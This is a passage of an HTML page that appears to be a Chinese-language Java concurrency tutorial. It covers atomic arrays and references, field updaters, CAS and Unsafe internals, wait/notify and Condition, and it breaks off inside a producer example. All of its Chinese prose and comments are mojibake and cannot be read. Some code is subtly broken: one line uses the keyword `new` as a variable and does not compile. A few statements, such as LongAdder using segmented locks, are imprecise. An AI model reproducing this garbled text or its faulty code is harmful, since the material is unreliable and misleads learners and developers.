<li>æ•°ç»„é•¿åº¦åœ¨åˆ›å»ºæ—¶ç¡®å®šï¼Œä¸èƒ½æ”¹å˜</li>
<li>æ¯ä¸ªå…ƒç´ éƒ½æ˜¯åŸå­æ“ä½œçš„</li>
<li>ä¸åŒç´¢å¼•çš„å…ƒç´ å¯ä»¥å¹¶å‘è®¿é—®</li>
</ul>
<h4 data-id="heading-201">AtomicLongArray</h4>
<p><strong>AtomicLongArrayä¸AtomicIntegerArrayç±»ä¼¼ï¼Œç”¨äºé•¿æ•´å‹æ•°ç»„ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">AtomicLongArray</span> <span class="hljs-variable">array</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLongArray</span>(<span class="hljs-number">10</span>);
array.addAndGet(<span class="hljs-number">0</span>, <span class="hljs-number">100</span>);               <span class="hljs-comment">// æ–¹æ³•åŒAtomicIntegerArray</span>
</code></pre>
<h4 data-id="heading-202">AtomicReferenceArray</h4>
<p><strong>AtomicReferenceArrayç”¨äºå¼•ç”¨ç±»å‹æ•°ç»„çš„åŸå­æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReferenceArray&lt;String&gt; array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReferenceArray</span>&lt;&gt;(<span class="hljs-number">10</span>);
array.set(<span class="hljs-number">0</span>, <span class="hljs-string">"Hello"</span>);                 <span class="hljs-comment">// è®¾ç½®å…ƒç´ </span>
array.get(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// è·å–å…ƒç´ </span>
array.compareAndSet(<span class="hljs-number">0</span>, <span class="hljs-string">"Hello"</span>, <span class="hljs-string">"World"</span>);  <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
array.getAndSet(<span class="hljs-number">0</span>, <span class="hljs-string">"Java"</span>);           <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
</code></pre>
<h3 data-id="heading-203">9.4 å¼•ç”¨ç±»å‹åŸå­ç±»</h3>
<h4 data-id="heading-204">AtomicReference</h4>
<p><strong>AtomicReferenceç”¨äºåŸå­åœ°æ›´æ–°å¼•ç”¨ç±»å‹å˜é‡ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;(<span class="hljs-string">"åˆå§‹å€¼"</span>);
ref.get();                              <span class="hljs-comment">// è·å–å€¼</span>
ref.set(<span class="hljs-string">"æ–°å€¼"</span>);                        <span class="hljs-comment">// è®¾ç½®å€¼</span>
ref.compareAndSet(<span class="hljs-string">"æ–°å€¼"</span>, <span class="hljs-string">"æ›´æ–°å€¼"</span>);   <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
ref.getAndSet(<span class="hljs-string">"æœ€ç»ˆå€¼"</span>);               <span class="hljs-comment">// è·å–å¹¶è®¾ç½®</span>
</code></pre>
<p><strong>å•ä¾‹æ¨¡å¼åº”ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> AtomicReference&lt;Singleton&gt; instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicReference</span>&lt;&gt;();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
    <span class="hljs-type">Singleton</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> instance.get();
    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">null</span>) {
        current = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();
        <span class="hljs-keyword">if</span> (instance.compareAndSet(<span class="hljs-literal">null</span>, current)) {
            <span class="hljs-keyword">return</span> current;
        }
        <span class="hljs-keyword">return</span> instance.get();
    }
    <span class="hljs-keyword">return</span> current;
}
</code></pre>
<h4 data-id="heading-205">AtomicStampedReference</h4>
<p><strong>AtomicStampedReferenceé€šè¿‡ç‰ˆæœ¬å·è§£å†³ABAé—®é¢˜ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicStampedReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicStampedReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-number">0</span>);

<span class="hljs-comment">// è·å–å€¼å’Œç‰ˆæœ¬å·</span>
<span class="hljs-type">int</span>[] stampHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(stampHolder);
<span class="hljs-type">int</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> stampHolder[<span class="hljs-number">0</span>];

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œç‰ˆæœ¬å·ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, stamp, stamp + <span class="hljs-number">1</span>);

<span class="hljs-comment">// è®¾ç½®å€¼å’Œç‰ˆæœ¬å·</span>
ref.set(<span class="hljs-string">"C"</span>, stamp + <span class="hljs-number">2</span>);
</code></pre>
<h4 data-id="heading-206">AtomicMarkableReference</h4>
<p><strong>AtomicMarkableReferenceä½¿ç”¨booleanæ ‡è®°ä»£æ›¿ç‰ˆæœ¬å·ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">AtomicMarkableReference&lt;String&gt; ref = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicMarkableReference</span>&lt;&gt;(<span class="hljs-string">"A"</span>, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// è·å–å€¼å’Œæ ‡è®°</span>
<span class="hljs-type">boolean</span>[] markHolder = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[<span class="hljs-number">1</span>];
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> ref.get(markHolder);
<span class="hljs-type">boolean</span> <span class="hljs-variable">mark</span> <span class="hljs-operator">=</span> markHolder[<span class="hljs-number">0</span>];

<span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®ï¼ˆåŒæ—¶æ¯”è¾ƒå€¼å’Œæ ‡è®°ï¼‰</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">success</span> <span class="hljs-operator">=</span> ref.compareAndSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// å°è¯•è®¾ç½®æ ‡è®°</span>
ref.attemptMark(<span class="hljs-string">"C"</span>, <span class="hljs-literal">true</span>);
</code></pre>
<h3 data-id="heading-207">9.5 å­—æ®µæ›´æ–°å™¨</h3>
<h4 data-id="heading-208">AtomicIntegerFieldUpdater</h4>
<p><strong>AtomicIntegerFieldUpdaterç”¨äºåŸå­åœ°æ›´æ–°å¯¹è±¡çš„æ•´å‹å­—æ®µã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å­—æ®µå¿…é¡»æ˜¯volatileç±»å‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// åˆ›å»ºæ›´æ–°å™¨</span>
AtomicIntegerFieldUpdater&lt;Counter&gt; updater = 
    AtomicIntegerFieldUpdater.newUpdater(Counter.class, <span class="hljs-string">"count"</span>);

<span class="hljs-comment">// ä½¿ç”¨æ›´æ–°å™¨</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">counter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
updater.get(counter);                  <span class="hljs-comment">// è·å–å€¼</span>
updater.set(counter, <span class="hljs-number">10</span>);              <span class="hljs-comment">// è®¾ç½®å€¼</span>
updater.incrementAndGet(counter);      <span class="hljs-comment">// è‡ªå¢</span>
updater.addAndGet(counter, <span class="hljs-number">5</span>);         <span class="hljs-comment">// åŠ 5</span>
</code></pre>
<p><strong>ä½¿ç”¨é™åˆ¶ï¼š</strong></p>
<ul>
<li>å­—æ®µå¿…é¡»æ˜¯volatileç±»å‹</li>
<li>å­—æ®µå¿…é¡»æ˜¯å¯è®¿é—®çš„ï¼ˆpublicæˆ–protectedï¼‰</li>
<li>ä¸èƒ½æ˜¯staticå­—æ®µ</li>
<li>ä¸èƒ½æ˜¯finalå­—æ®µ</li>
</ul>
<h4 data-id="heading-209">AtomicLongFieldUpdater</h4>
<p><strong>AtomicLongFieldUpdaterç”¨äºé•¿æ•´å‹å­—æ®µçš„åŸå­æ›´æ–°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Account</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">long</span> <span class="hljs-variable">balance</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
}

AtomicLongFieldUpdater&lt;Account&gt; updater = 
    AtomicLongFieldUpdater.newUpdater(Account.class, <span class="hljs-string">"balance"</span>);
updater.addAndGet(account, <span class="hljs-number">100</span>);       <span class="hljs-comment">// æ–¹æ³•åŒAtomicIntegerFieldUpdater</span>
</code></pre>
<h4 data-id="heading-210">AtomicReferenceFieldUpdater</h4>
<p><strong>AtomicReferenceFieldUpdaterç”¨äºå¼•ç”¨ç±»å‹å­—æ®µçš„åŸå­æ›´æ–°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> Node next;        <span class="hljs-comment">// å¿…é¡»æ˜¯volatile</span>
}

AtomicReferenceFieldUpdater&lt;Node, Node&gt; updater = 
    AtomicReferenceFieldUpdater.newUpdater(Node.class, Node.class, <span class="hljs-string">"next"</span>);

<span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
updater.get(node);                     <span class="hljs-comment">// è·å–å€¼</span>
updater.set(node, newNode);            <span class="hljs-comment">// è®¾ç½®å€¼</span>
updater.compareAndSet(node, old, <span class="hljs-keyword">new</span>); <span class="hljs-comment">// æ¯”è¾ƒå¹¶è®¾ç½®</span>
</code></pre>
<h3 data-id="heading-211">9.6 åŸå­ç±»çš„å®ç°åŸç†</h3>
<h4 data-id="heading-212">CASæ“ä½œ</h4>
<p><strong>åŸå­ç±»çš„æ ¸å¿ƒæ˜¯CASæ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AtomicIntegerçš„incrementAndGetå®ç°ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">incrementAndGet</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> unsafe.getAndAddInt(<span class="hljs-built_in">this</span>, valueOffset, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;
}

<span class="hljs-comment">// Unsafeçš„getAndAddIntå®ç°</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAndAddInt</span><span class="hljs-params">(Object o, <span class="hljs-type">long</span> offset, <span class="hljs-type">int</span> delta)</span> {
    <span class="hljs-type">int</span> v;
    <span class="hljs-keyword">do</span> {
        v = getIntVolatile(o, offset); <span class="hljs-comment">// è·å–å½“å‰å€¼</span>
        <span class="hljs-comment">// CASå°è¯•æ›´æ–°ï¼Œå¦‚æœå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</span>
    } <span class="hljs-keyword">while</span> (!compareAndSwapInt(o, offset, v, v + delta));
    <span class="hljs-keyword">return</span> v;
}
</code></pre>
<h4 data-id="heading-213">Unsafeç±»çš„ä½¿ç”¨</h4>
<p><strong>åŸå­ç±»é€šè¿‡Unsafeç±»ç›´æ¥æ“ä½œå†…å­˜ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicInteger</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Number</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> Unsafe.getUnsafe();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> valueOffset; <span class="hljs-comment">// valueå­—æ®µçš„åç§»é‡</span>
    
    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è·å–valueå­—æ®µåœ¨å¯¹è±¡ä¸­çš„åç§»é‡</span>
            valueOffset = unsafe.objectFieldOffset
                (AtomicInteger.class.getDeclaredField(<span class="hljs-string">"value"</span>));
        } <span class="hljs-keyword">catch</span> (Exception ex) { <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(ex); }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> value; <span class="hljs-comment">// ä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSet</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
        <span class="hljs-comment">// ä½¿ç”¨CASæ“ä½œåŸå­åœ°æ›´æ–°valueå­—æ®µ</span>
        <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, valueOffset, expect, update);
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨<code>objectFieldOffset</code>è·å–å­—æ®µåç§»é‡</li>
<li>ä½¿ç”¨<code>compareAndSwapInt</code>è¿›è¡ŒCASæ“ä½œ</li>
<li>valueå­—æ®µä½¿ç”¨volatileä¿è¯å¯è§æ€§</li>
</ul>
<h4 data-id="heading-214">è‡ªæ—‹æœºåˆ¶</h4>
<p><strong>CASå¤±è´¥åä¼šè‡ªæ—‹é‡è¯•ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªæ—‹å®ç°ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">incrementAndGet</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> current;
    <span class="hljs-type">int</span> next;
    <span class="hljs-keyword">do</span> {
        current = get();        <span class="hljs-comment">// 1. è·å–å½“å‰å€¼</span>
        next = current + <span class="hljs-number">1</span>;     <span class="hljs-comment">// 2. è®¡ç®—æ–°å€¼</span>
        <span class="hljs-comment">// 3. CASå°è¯•æ›´æ–°ï¼Œå¦‚æœå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</span>
    } <span class="hljs-keyword">while</span> (!compareAndSet(current, next));
    <span class="hljs-keyword">return</span> next;
}
</code></pre>
<p><strong>è‡ªæ—‹çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…çº¿ç¨‹é˜»å¡å’Œå”¤é†’çš„å¼€é”€</li>
<li>åœ¨ä½ç«äº‰åœºæ™¯ä¸‹æ€§èƒ½å¥½</li>
</ul>
<p><strong>è‡ªæ—‹çš„é—®é¢˜ï¼š</strong></p>
<ul>
<li>é«˜ç«äº‰åœºæ™¯ä¸‹ä¼šæµªè´¹CPU</li>
<li>å¯èƒ½å¯¼è‡´CPUä½¿ç”¨ç‡100%</li>
</ul>
<p><strong>ä¼˜åŒ–ç­–ç•¥ï¼š</strong></p>
<ul>
<li>JDK 8+æä¾›äº†LongAdderç­‰ç´¯åŠ å™¨ï¼Œä½¿ç”¨åˆ†æ®µé”å‡å°‘ç«äº‰</li>
<li>é«˜ç«äº‰æ—¶å¯ä»¥ä½¿ç”¨synchronized</li>
</ul>
<hr/>
<h2 data-id="heading-215">ç¬¬åç«  çº¿ç¨‹é—´é€šä¿¡</h2>
<h3 data-id="heading-216">10.1 wait/notify/notifyAll</h3>
<h4 data-id="heading-217">Object.wait()æ–¹æ³•</h4>
<p><strong>wait()æ–¹æ³•ä½¿å½“å‰çº¿ç¨‹è¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œç›´åˆ°è¢«å…¶ä»–çº¿ç¨‹å”¤é†’ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// ç­‰å¾…</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.wait();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼Œè¿›å…¥ç­‰å¾…çŠ¶æ€</span>
}

<span class="hljs-comment">// å”¤é†’</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.notify();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹</span>
}
</code></pre>
<p><strong>wait()çš„è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</li>
<li>è°ƒç”¨wait()ä¼šé‡Šæ”¾é”</li>
<li>çº¿ç¨‹è¿›å…¥WAITINGçŠ¶æ€</li>
<li>è¢«å”¤é†’åéœ€è¦é‡æ–°è·å–é”æ‰èƒ½ç»§ç»­æ‰§è¡Œ</li>
</ul>
<p><strong>wait()çš„é‡è½½æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">lock.wait();                      <span class="hljs-comment">// æ— é™æœŸç­‰å¾…</span>
lock.wait(<span class="hljs-number">1000</span>);                  <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span>
lock.wait(<span class="hljs-number">1000</span>, <span class="hljs-number">500000</span>);         <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´ï¼ˆæ¯«ç§’+çº³ç§’ï¼‰</span>
</code></pre>
<h4 data-id="heading-218">Object.notify()æ–¹æ³•</h4>
<p><strong>notify()æ–¹æ³•å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„å•ä¸ªçº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// ç­‰å¾…æ¡ä»¶</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {  <span class="hljs-comment">// ä½¿ç”¨whileï¼Œé˜²æ­¢è™šå‡å”¤é†’</span>
        lock.wait();
    }
    <span class="hljs-comment">// æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œä»»åŠ¡</span>
}

<span class="hljs-comment">// è®¾ç½®æ¡ä»¶</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    condition = <span class="hljs-literal">true</span>;
    lock.notify();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
}
</code></pre>
<p><strong>notify()çš„è¦ç‚¹ï¼š</strong></p>
<ul>
<li>å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</li>
<li>åªèƒ½å”¤é†’åœ¨æ­¤å¯¹è±¡ä¸Šwait()çš„çº¿ç¨‹</li>
<li>å¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹åœ¨ç­‰å¾…ï¼Œéšæœºå”¤é†’ä¸€ä¸ª</li>
<li>è¢«å”¤é†’çš„çº¿ç¨‹éœ€è¦é‡æ–°è·å–é”</li>
</ul>
<h4 data-id="heading-219">Object.notifyAll()æ–¹æ³•</h4>
<p><strong>notifyAll()æ–¹æ³•å”¤é†’åœ¨æ­¤å¯¹è±¡ç›‘è§†å™¨ä¸Šç­‰å¾…çš„æ‰€æœ‰çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.notifyAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹</span>
}
</code></pre>
<p><strong>notify() vs notifyAll()ï¼š</strong></p>

























<table><thead><tr><th>ç‰¹æ€§</th><th>notify()</th><th>notifyAll()</th></tr></thead><tbody><tr><td><strong>å”¤é†’æ•°é‡</strong></td><td>1ä¸ªçº¿ç¨‹</td><td>æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>æ‰€æœ‰ç­‰å¾…çº¿ç¨‹å¤„ç†ç›¸åŒçš„ä»»åŠ¡</td><td>ç­‰å¾…çº¿ç¨‹å¤„ç†ä¸åŒçš„ä»»åŠ¡</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>æ›´å¥½ï¼ˆåªå”¤é†’ä¸€ä¸ªï¼‰</td><td>è¾ƒå·®ï¼ˆå”¤é†’æ‰€æœ‰ï¼‰</td></tr></tbody></table>
<h4 data-id="heading-220">ä½¿ç”¨æ³¨æ„äº‹é¡¹</h4>
<p><strong>1. å¿…é¡»åœ¨synchronizedå—ä¸­è°ƒç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¼šæŠ›å‡ºIllegalMonitorStateException</span>
lock.wait();

<span class="hljs-comment">// âœ… æ­£ç¡®</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    lock.wait();
}
</code></pre>
<p><strong>2. ä½¿ç”¨whileå¾ªç¯æ£€æŸ¥æ¡ä»¶ï¼ˆé˜²æ­¢è™šå‡å”¤é†’ï¼‰</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¯èƒ½äº§ç”Ÿè™šå‡å”¤é†’</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">if</span> (!condition) {
        lock.wait();
    }
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨whileå¾ªç¯</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {
        lock.wait();
    }
}
</code></pre>
<p><strong>3. æ³¨æ„é”çš„æŒæœ‰æ—¶é—´</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæŒæœ‰é”æ—¶é—´è¿‡é•¿</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    heavyOperation();  <span class="hljs-comment">// è€—æ—¶æ“ä½œ</span>
    lock.wait();
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šåœ¨é”å¤–æ‰§è¡Œè€—æ—¶æ“ä½œ</span>
<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {
        lock.wait();
    }
}
heavyOperation();  <span class="hljs-comment">// åœ¨é”å¤–æ‰§è¡Œ</span>
</code></pre>
<h4 data-id="heading-221">è™šå‡å”¤é†’é—®é¢˜</h4>
<p><strong>è™šå‡å”¤é†’ï¼š</strong> çº¿ç¨‹å¯èƒ½åœ¨æ²¡æœ‰è°ƒç”¨notify()çš„æƒ…å†µä¸‹è¢«å”¤é†’ã€‚</p>
<p><strong>åŸå› ï¼š</strong> æ“ä½œç³»ç»Ÿå±‚é¢çš„ä¿¡å·ã€å…¶ä»–ç³»ç»Ÿè°ƒç”¨ã€JVMå®ç°ç»†èŠ‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨whileå¾ªç¯è€Œä¸æ˜¯if</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-keyword">while</span> (!condition) {  <span class="hljs-comment">// ä½¿ç”¨whileï¼Œè¢«å”¤é†’åå†æ¬¡æ£€æŸ¥</span>
        lock.wait();
    }
    <span class="hljs-comment">// æ¡ä»¶æ»¡è¶³ï¼Œæ‰§è¡Œä»»åŠ¡</span>
}
</code></pre>
<h3 data-id="heading-222">10.2 Conditionæœºåˆ¶</h3>
<h4 data-id="heading-223">Condition.await()</h4>
<p><strong>Conditionæä¾›äº†æ›´çµæ´»çš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">condition</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// ç­‰å¾…</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.await();  <span class="hljs-comment">// é‡Šæ”¾é”å¹¶ç­‰å¾…</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}

<span class="hljs-comment">// å”¤é†’</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<p><strong>await()çš„é‡è½½æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">condition.await();                                    <span class="hljs-comment">// æ— é™æœŸç­‰å¾…</span>
condition.awaitNanos(<span class="hljs-number">1000000</span>);                       <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šçº³ç§’</span>
condition.await(<span class="hljs-number">1</span>, TimeUnit.SECONDS);               <span class="hljs-comment">// ç­‰å¾…æŒ‡å®šæ—¶é—´</span>
condition.awaitUntil(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());                    <span class="hljs-comment">// ç­‰å¾…åˆ°æŒ‡å®šæ—¥æœŸ</span>
condition.awaitUninterruptibly();                    <span class="hljs-comment">// ä¸å“åº”ä¸­æ–­</span>
</code></pre>
<h4 data-id="heading-224">Condition.signal()</h4>
<p><strong>signal()å”¤é†’ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signal();  <span class="hljs-comment">// å”¤é†’ä¸€ä¸ªç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-225">Condition.signalAll()</h4>
<p><strong>signalAll()å”¤é†’æ‰€æœ‰ç­‰å¾…çš„çº¿ç¨‹ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java">lock.lock();
<span class="hljs-keyword">try</span> {
    condition.signalAll();  <span class="hljs-comment">// å”¤é†’æ‰€æœ‰ç­‰å¾…çº¿ç¨‹</span>
} <span class="hljs-keyword">finally</span> {
    lock.unlock();
}
</code></pre>
<h4 data-id="heading-226">å¤šä¸ªConditionçš„ä½¿ç”¨</h4>
<p><strong>Conditionçš„ä¼˜åŠ¿ï¼šå¯ä»¥ä¸ºä¸åŒçš„æ¡ä»¶åˆ›å»ºä¸åŒçš„Conditionã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Lock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();  <span class="hljs-comment">// ä¸ç©ºæ¡ä»¶</span>
<span class="hljs-type">Condition</span> <span class="hljs-variable">notFull</span> <span class="hljs-operator">=</span> lock.newCondition();   <span class="hljs-comment">// ä¸æ»¡æ¡ä»¶</span>

<span class="hljs-comment">// ç”Ÿäº§è€…ï¼šç­‰å¾…ä¸æ»¡æ¡ä»¶ï¼Œé€šçŸ¥ä¸ç©ºæ¡ä»¶</span>
lock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">while</span> (count == items.length)
        notFull.await();
    <span class="hljs-comment">// ç”Ÿäº§...</span>
